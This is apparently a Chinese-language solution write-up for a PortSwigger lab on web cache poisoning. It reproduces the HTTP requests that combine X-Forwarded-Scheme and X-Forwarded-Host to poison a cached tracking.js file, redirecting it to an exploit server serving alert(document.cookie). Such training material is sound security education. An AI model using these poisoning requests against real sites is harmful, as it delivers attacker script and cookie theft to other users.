# 实验室：利用多个头的 Web 缓存投毒

本实验室包含一个 Web 缓存投毒漏洞，该漏洞仅在你使用多个头构造恶意请求时才可利用。一名用户大约每分钟访问一次首页。要解决本实验室，请投毒缓存，使响应在访客浏览器中执行 `alert(document.cookie)`。

> **提示**  
> 本实验室同时支持 `X-Forwarded-Host` 和 `X-Forwarded-Scheme` 头。

[访问实验室](https://portswigger.net/academy/labs/launch/ef8228ac8678117cd722c596ac9f2f9e76bbf7d6d2f09a53ce7cf28d04ccff7a)

## 步骤

探测
- 没有发现任何有趣的内容
- 使用提示的头部，或 Param Miner 扩展进行头部探测
    - 扩展探测请求
        ```http
        GET /login?z03ss7=1 HTTP/2
        Host: 0a1a00910411b93b80ea8a7a00cf005e.web-security-academy.net
        X-Forwarded-Scheme: zwrtxqvahglgtaniu1oixjf
        ```

    - 响应

        ```http
        HTTP/2 302 Found
        Location: https://0a1a00910411b93b80ea8a7a00cf005e.web-security-academy.net/login?z03ss7=1
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Content-Length: 0
        ```
    - 设置覆盖协议头部 `X-Forwarded-Scheme`，响应 302 重定向

- 手动测试覆盖协议头部 `X-Forwarded-Scheme`
    - 可复现
    - 缓存 hit，非缓存键

- 此处继续尝试对 `Location` 的 Host 头覆盖攻击，或使用 Param Miner 扩展进行头部探测
    - 手动请求
        ```http
        GET /login HTTP/2
        Host: 0a1a00910411b93b80ea8a7a00cf005e.web-security-academy.net
        X-Forwarded-Scheme: x
        X-Forwarded-Host: foo.bar
        ```

    - 响应
        ```http
        HTTP/2 302 Found
        Location: https://foo.bar/login
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Content-Length: 0
        ```

    - 存在重定向响应的 host 头注入漏洞
    - 发送设置/删除头部的两个请求
        - 缓存 hit，非缓存键


缓存投毒目标：首页或首页加载的脚本
- 选择脚本。首页的脚本加载
    ```html
    <script type="text/javascript" src="/resources/js/tracking.js">
    </script>
    ```

- 普通脚本请求
    ```http
    GET /resources/js/tracking.js HTTP/2
    Host: 0a1a00910411b93b80ea8a7a00cf005e.web-security-academy.net
    ```

- 设置攻击者载荷页面
    ```js
    alert(document.cookie)
    ```

- 构造脚本投毒请求
    ```http
    GET /resources/js/tracking.js HTTP/2
    Host: 0a1a00910411b93b80ea8a7a00cf005e.web-security-academy.net
    X-Forwarded-Scheme: x
    X-Forwarded-Host: exploit-0a69008d04ddb9068009898201b20010.exploit-server.net/exploit#
    ```
    - 此处使用默认攻击者端点 `/exploit` 并设置 hash 片段符号以消除预期上下文的固定后缀。
        - 或设置攻击者端点为匹配路径

    - 响应

        ```http
        HTTP/2 302 Found
        Location: https://exploit-0a69008d04ddb9068009898201b20010.exploit-server.net/exploit#/resources/js/tracking.js
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Content-Length: 0
        ```

    - 成功设置开放重定向，并投毒 JS 资源

- 浏览器加载任意使用被投毒 JS 的页面
    - 成功触发 JS 载荷执行

- 投毒几次后通关
